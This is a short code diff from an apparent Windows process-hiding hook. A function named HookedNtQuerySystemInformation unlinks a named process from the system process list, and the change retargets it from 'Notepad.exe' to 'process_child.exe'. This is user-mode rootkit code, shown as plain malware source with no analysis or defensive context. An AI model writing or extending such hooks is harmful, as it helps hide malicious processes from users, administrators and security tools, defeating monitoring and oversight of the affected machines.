@@ -65,7 +65,7 @@ NTSTATUS NTAPI HookedNtQuerySystemInformation(
                 pNextEntry->ImageName.Length > 0) {
 
                 // Comparaison case-insensitive pour plus de robustesse
-                if (_wcsicmp(pNextEntry->ImageName.Buffer, L"Notepad.exe") == 0) {
+                if (_wcsicmp(pNextEntry->ImageName.Buffer, L"process_child.exe") == 0) {
                     if (pNextEntry->NextEntryOffset == 0) {
                         pCurrent->NextEntryOffset = 0;
                     }
